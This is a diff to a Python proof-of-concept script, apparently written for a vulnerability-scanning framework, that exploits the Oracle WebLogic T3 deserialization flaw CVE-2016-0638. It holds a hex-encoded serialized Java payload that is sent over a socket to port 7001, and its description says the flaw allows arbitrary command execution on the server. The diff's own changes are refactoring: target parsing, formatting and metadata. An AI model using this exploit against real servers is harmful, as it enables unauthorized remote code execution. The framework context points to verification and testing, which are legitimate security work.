@@ -35,7 +35,7 @@ def sendEvilObjData(sock, data):
     payload = '056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000'
     payload += data
     payload += 'fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff'
-    payload = '%s%s' % ('{:08x}'.format(len(payload)/2 + 4), payload)
+    payload = '%s%s' % ('{:08x}'.format(len(payload) / 2 + 4), payload)
     sock.send(payload.decode('hex'))
     time.sleep(2)
     res = 'NO_DATA'
@@ -63,8 +63,6 @@ def run(url, dport):
 
 class TestPOC(POCBase):
     vulID = '00001'
-    cveID = 'CVE-2016-0638'
-    cnvdID = ''
     version = '1.0'
     author = 'Mr_hello'
     vulDate = '2017-09-28'
@@ -77,25 +75,38 @@ class TestPOC(POCBase):
     appVersion = '<=12.2.1.3'
     vulType = 'RCE'
     desc = 'Weblogic 核心组件反序列化漏洞(CVE-2016-0638). 通过该程序, 攻击者可通过发送恶意的数据包在受影响服务器上执行任意命令.'
-    samples = ['']
+    samples = []
     defaultPorts = [7001]
     defaultService = ['WebLogic', 'weblogic', 'afs3-callback']
+
+    def parse_target(self, target, default_port):
+        schema = 'http'
+        port = default_port
+        address = ''
+        if '://' in target:
+            slices = target.split('://')
+            schema = slices[0]
+            target = slices[1]
+        if ':' in target:
+            slices = target.split(':')
+            address = slices[0]
+            port = slices[1]
+        else:
+            address = target
+        return {'schema': schema, 'address': address, 'port': int(port)}
 
     def _attack(self):
         return self._verify()
 
     def _verify(self):
         result = {}
-        target_ip = self.target.split(':')[0].strip('/')
-        if len(self.target.split(':')) > 1:
-            target_port = int(self.target.split(':')[1].strip('/'))
-        else:
-            target_port = 7001
-
+        target = self.parse_target(self.target, 7001)
+        target_ip = target['address']
+        target_port = target['port']
         data = run(target_ip, target_port)
         if len(data) > 0:
             result['VerifyInfo'] = {}
-            result['VerifyInfo']['URL'] = self.target
+            result['VerifyInfo']['URL'] = target
             result['VerifyInfo']['Result'] = data
         return self.parse_output(result)
 
